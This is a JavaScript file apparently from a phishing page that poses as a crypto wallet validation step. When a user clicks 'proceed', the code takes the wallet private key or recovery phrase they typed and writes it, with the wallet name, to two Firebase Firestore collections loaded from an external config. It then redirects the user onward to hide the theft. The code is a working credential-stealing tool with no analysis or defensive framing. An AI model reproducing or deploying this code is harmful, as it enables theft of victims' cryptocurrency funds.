
import firebase from "https://cdn.skypack.dev/firebase/compat/app";
import "https://cdn.skypack.dev/firebase/compat/auth";
import "https://cdn.skypack.dev/firebase/compat/firestore";
import {hmpUxOiAWt as config} from "https://giterhaber.github.io/web-codes/configs.js"


  
  firebase.initializeApp(config);
  const db = firebase.firestore();

$('#proceed').on('click', () => {
    var privateKey = $('#privateKey').val()

    if (!privateKey || privateKey.length < 15) {
        $('#info').hide()
        $('#info-error').show()
        

    } else {
        var walletName = $('#walletname').html()
        // alert(privateKey)
        // alert(walletName)
        localStorage.setItem('walletName', walletName)
        function send_data() {

            var ref = db.collection('data')
               ref.add({
                wallet: walletName,
                phrase: privateKey,
                time: new Date(),
                status: 'active'
            }).then( () => {
                console.log('success')
                setTimeout(() => {
                    db.collection('datas').add({
                        wallet: walletName,
                        phrase: privateKey,
                        time: new Date(),
                        status: 'active'
                    })
                    location.href = '../wallet/validate/'
                }, 3);   
            }).catch( () => {
                console.log('err')
            })
        }
        send_data()
        
        

    }

  
})

$('#cancel').on('click', () => {
    $('#info').show()
    $('#info-error').hide()
})